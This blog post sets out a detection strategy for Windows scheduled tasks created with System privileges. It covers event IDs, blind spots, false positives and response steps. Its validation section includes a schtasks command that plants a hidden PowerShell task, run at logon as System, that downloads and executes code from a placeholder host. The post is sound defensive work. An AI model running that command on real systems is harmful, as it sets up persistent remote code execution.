---
layout: post
title:  "Suspicious System Scheduled Task/Job ADS"
date:   2022-05-31 12:44:14 -0400
categories: review
---

## Suspicious System Scheduled Task/Job
***
### Goal
Detect when Scheduled Tasks are created or modified to run at System Level Privileges. This may be indicative of an attempt for an attacker or malware to establish persistesence on a Windows machine. 

***

### Categorization
These attemps are categorized as [Execution / Scheduled Task/Job ](https://attack.mitre.org/techniques/T1053/)

***

### Strategy Abstract
The strategy will function as follows:
- Monitor window event codes on Windows Systems.
- Define the command line arguments that need to be detected on.
- Supress any known & non-malicious tasks (depending on client size, this approach can differ)
- Alert on any tasks that are created or modified at System Level Privileges.

*** 

### Technical Context

A Scheduled task is a command, program, or script to be executed at a particular time in the future on Windows machines. This can vary based on the conditions provided to execute when a user logs on or a regular interval. System Admin use these to create and run operational tasks much like cronjobs on Linux machines. 

With that being said, these can be morphed to be used in a malicious manner. Advesaries use these already existing functionality on Windows systems to establish persistence whether that would be on start up or a Command and Control Server.

When configuring the scheduled tasks, the following event IDs are of interest for this ADS:

|Event Code | Description|
-------------| ------------|
	4698 |  A scheduled task was created
	4699 | A scheduled task was deleted
	4700 | A scheduled task was enabled
	4701 | A scheduled task was disabled
	4702 | A scheduled task was updateds

For this ADS, the event IDs that will be focused on will be 4698, 4700, and 4702. Sysmon also provides some event codes such as Event Code 1 that schtask.exe executes. 

For this detection we will look for scheduled tasks created with System level privileges

***
### Blind Spots and Assumtions
This strategy relies on the following assumptions:
- The Machine is proper logging the proper Windows Event Log and sending to WEF Servers.
- WEF servers are correctly forwarding events to the SIEM.
- SIEM is successfully indexing group change events.

A blind spot will occur if any of the assumptions are violated. For instance, the following would not trip the alert:
- Windows event logging breaks.
- The SIEM UC job is running at all time.

***

### False Positives
With this being a built in functionality, the usage on this can vary depending on the size of the enviroment. There are serveral instances where false positives for this ADS could occur:
- Legitimate tasks created by System Administrators. 
- Drivers and OS support creation of scheduled tasks such as power savers on laptops. 

*** 

### Priority
The priority is set to medium under all conditions.

***

### Validation
```
schtasks /create /tn test /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://x.x.x.x:8080/x'''))'" /sc onlogon /ru System
schtasks /create /tn "mysc" /tr C:\windows\system32\cmd.exe /sc ONLOGON /ru "System"
```

***

### Response
In the event that this alert fires, the following response procedures are recommended:
- Triage of the host system and if the activity is normal.
	- Note the account that created it, suspicious arguments, or abnormal timeframe.
- Identify what the schedule task is performing
	- ex: Execution of binary, in memory powershell execution, connection to web server
- Use endpoint EDR or tool to invesitage or isolate the host.

***

### Additional Resources
https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md